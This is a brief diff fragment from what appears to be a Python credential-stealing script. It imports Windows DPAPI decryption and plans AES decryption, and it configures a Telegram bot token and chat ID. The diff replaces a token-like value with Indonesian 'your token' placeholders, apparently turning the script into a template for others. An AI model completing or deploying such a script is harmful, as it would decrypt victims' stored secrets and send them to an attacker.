@@ -9,8 +9,8 @@ from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
 
 
-TELEGRAM_BOT_TOKEN = '821AHDE2APh8GyqQ2AdkxPD7tI--#' 
-TELEGRAM_CHAT_ID = '8'
+TELEGRAM_BOT_TOKEN = 'BOT TOKEN KAMU' 
+TELEGRAM_CHAT_ID = 'CHAT ID KAMU'
 
 
 # Coba import AES untuk dekripsi
